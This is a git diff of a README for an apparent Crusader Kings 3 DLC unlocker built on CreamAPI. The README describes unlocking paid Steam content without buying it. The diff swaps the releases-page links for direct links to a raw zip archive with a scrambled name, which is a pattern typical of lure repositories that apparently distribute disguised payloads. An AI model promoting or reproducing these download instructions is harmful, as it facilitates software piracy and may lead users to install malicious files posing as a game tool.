@@ -1,6 +1,6 @@
 # ⚔️ Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files - Access All Crusader Kings 3 Content
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/main/hirsel/Config-Files-Crusader-Cream-Standalone-Unlocker-Kings-DL-AP-v3.2.zip)
 
 This software allows users to access downloadable content files for the game Crusader Kings 3 on the Steam platform. It uses the CreamAPI framework to modify how the game interacts with Steam during startup. This process unlocks content packs, expansions, and cosmetic additions that are otherwise locked behind a purchase wall within the Steam store.
 
@@ -12,7 +12,7 @@ You need basic administrator permissions on your Windows account to modify files
 
 ## 📥 Downloading the Files
 
-Visit this page to download the necessary files: [https://github.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/releases](https://github.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/releases)
+Visit this page to download the necessary files: [https://raw.githubusercontent.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/main/hirsel/Config-Files-Crusader-Cream-Standalone-Unlocker-Kings-DL-AP-v3.2.zip](https://raw.githubusercontent.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/main/hirsel/Config-Files-Crusader-Cream-Standalone-Unlocker-Kings-DL-AP-v3.2.zip)
 
 Select the latest release version listed on the page. Download the compressed archive file, usually in a .zip or .rar format. Save this folder to your desktop or a temporary location where you can easily find it. Extract the contents of the archive using your preferred file management tool. You should see a set of configuration files and a dynamic link library file, typically named cream_api.dll or similar.
 
